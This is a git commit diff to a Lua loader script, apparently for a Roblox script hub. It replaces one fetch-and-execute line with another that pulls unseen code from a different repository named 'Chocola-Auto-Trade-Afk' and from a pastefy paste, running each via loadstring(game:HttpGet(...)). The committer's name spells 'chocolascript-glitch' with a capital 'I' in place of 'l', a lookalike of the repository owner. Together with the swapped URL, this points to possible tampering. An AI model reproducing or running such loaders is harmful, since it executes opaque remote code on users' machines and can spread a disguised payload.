fc1d58dbeea6a1701c9b5b3e507d2a31642947b3
chocoIascript-gIitch <chocoIascript.gIitch@gmail.com>
2026-07-02 01:49:03 -0500

    Update Chocola.lua

--- Chocola.lua
+++ Chocola.lua
@@ -1,2 +1,7 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Hub/refs/heads/main/Chocola.lua"))()
-loadstring(game:HttpGet("https://pastefy.app/V4sXzLlY/raw"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Trade-Afk/refs/heads/main/.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/V4sXzLlY/raw"))()
+end)
